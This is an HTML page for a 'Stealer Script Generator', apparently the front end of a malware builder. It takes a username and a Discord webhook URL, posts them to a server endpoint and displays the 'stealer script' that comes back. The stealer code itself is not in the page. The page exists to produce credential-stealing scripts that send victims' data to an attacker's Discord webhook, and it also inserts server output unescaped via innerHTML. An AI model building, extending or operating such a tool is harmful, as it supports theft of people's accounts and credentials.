<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Stealer Script Generator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0;
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #0f0f0f, #1e1e2f);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: rgba(20, 20, 40, 0.9);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px #0ff, 0 0 40px #09f inset;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    h2 {
      color: #0ff;
      text-shadow: 0 0 10px #09f, 0 0 20px #0ff;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: #2b2b3d;
      color: #0ff;
      font-size: 16px;
      box-shadow: inset 0 0 10px #09f;
    }
    input:focus {
      outline: none;
      box-shadow: 0 0 15px #0ff;
    }
    button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      background: linear-gradient(90deg, #0ff, #09f);
      color: #000;
      font-weight: bold;
      font-size: 18px;
      cursor: pointer;
      margin-top: 15px;
      transition: transform 0.2s, box-shadow 0.2s;
    }
    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 20px #0ff;
    }
    #result {
      margin-top: 20px;
      font-size: 14px;
      color: #0ff;
      word-break: break-word;
    }
    code {
      display: block;
      background: #111;
      color: #0f0;
      padding: 10px;
      border-radius: 8px;
      font-size: 13px;
      box-shadow: inset 0 0 10px #0f0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>⚡ Script Generator ⚡</h2>
    <input type="text" id="username" placeholder="Enter Username">
    <input type="text" id="webhook" placeholder="Enter Discord Webhook URL">
    <button onclick="sendData()">Generate Script</button>
    <div id="result"></div>
  </div>

  <script>
    async function sendData() {
      const username = document.getElementById("username").value;
      const webhook = document.getElementById("webhook").value;
      const result = document.getElementById("result");

      result.textContent = "⚙️ Generating Please wait...";
      const res = await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, webhook })
      });

      const data = await res.json();
      if (res.ok) {
        result.innerHTML = `✅ Stealer Script Generated:<br><code>${data.script}</code>`;
      } else {
        result.textContent = "❌ Error: " + (data.body || data);
      }
    }
  </script>
</body>
</html>
